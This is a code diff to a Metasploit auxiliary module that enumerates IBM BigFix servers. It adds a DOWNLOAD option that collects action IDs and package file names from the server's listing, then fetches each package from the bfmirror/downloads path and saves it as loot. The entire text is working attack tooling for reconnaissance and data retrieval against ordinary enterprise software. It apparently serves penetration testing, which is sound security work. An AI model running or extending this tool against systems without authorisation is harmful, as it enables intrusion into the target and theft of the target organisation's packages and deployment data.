@@ -39,7 +39,12 @@ class MetasploitModule < Msf::Auxiliary
       OptString.new('TARGETURI', [true, 'Path to the BigFix server', '/']),
       OptBool.new('SHOW_MASTHEAD', [true, 'Retrieve information from masthead file', true]),
       OptBool.new('SHOW_SITES', [true, 'Retrieve site listing', true]),
-      OptBool.new('SHOW_PACKAGES', [true, 'Retrieve packages list', true])
+      OptBool.new('SHOW_PACKAGES', [true, 'Retrieve packages list', true]),
+      OptBool.new('DOWNLOAD', [true, 'Attempt to download packages', false])
+    ]
+
+    register_advanced_options [
+      OptBool.new('ShowURL', [true, 'Show URL instead of filename', false])
     ]
   end
 
@@ -77,26 +82,58 @@ class MetasploitModule < Msf::Auxiliary
     return unless res && res.code == 200
 
     print_status('Packages')
+    last_action = nil
+    @files = {}
+
     myhtml = res.get_html_document
     myhtml.css('.indented p').each do |element|
       element.children.each do |text|
         if text.class == Nokogiri::XML::Text
-          print_good(text.text) unless text.text.start_with?('Error')
-=begin
+          next if text.text.start_with?('Error')
+
           text.text =~ /^([^ ]+)/
           case $1
-            when 'Action:' then print_status(text.text)
-            when 'url' then print_good(text.text)
+          when 'Action:'
+            # Save Action to associate URLs
+            text.text =~ /Action: ([0-9]+)/
+            last_action = $1
+            @files[last_action] = []
+            print_status("Action: #{last_action}")
+          when 'url'
+            text.text =~ /^[^:]+: (.*)/
+            uri = URI.parse($1)
+            file = File.basename(uri.path)
+            @files[last_action].append(file)
+            datastore['ShowURL'] ? print_good("URL: #{$1}") : print_good("File: #{file}")
           end
-=end
         end
       end
+    end
+  end
+
+  def download
+    print_status('Downloading packages')
+    @files.each do |action, val|
+      next if val.empty?
+      res = send_req("bfmirror/downloads/#{action}/0")
+      next unless res && res.code == 200
+
+      print_status("Downloading file #{val.first}")
+      res = send_req("bfmirror/downloads/#{action}/1")
+      unless res && res.code == 200
+        print_error("Failed to download #{val.first}")
+        next
+      end
+
+      myloot = store_loot('ibm.bigfix.package', File.extname(val.first), datastore['RHOST'], res.body, val.first)
+      print_good("Saved #{val.first} to #{myloot.to_s}")
     end
   end
 
   def run
     masthead if datastore['SHOW_MASTHEAD']
     sites if datastore['SHOW_SITES']
-    packages if datastore['SHOW_PACKAGES']
+    packages if datastore['SHOW_PACKAGES'] || datastore['DOWNLOAD']
+    download if datastore['DOWNLOAD'] && @files != {}
   end
 end
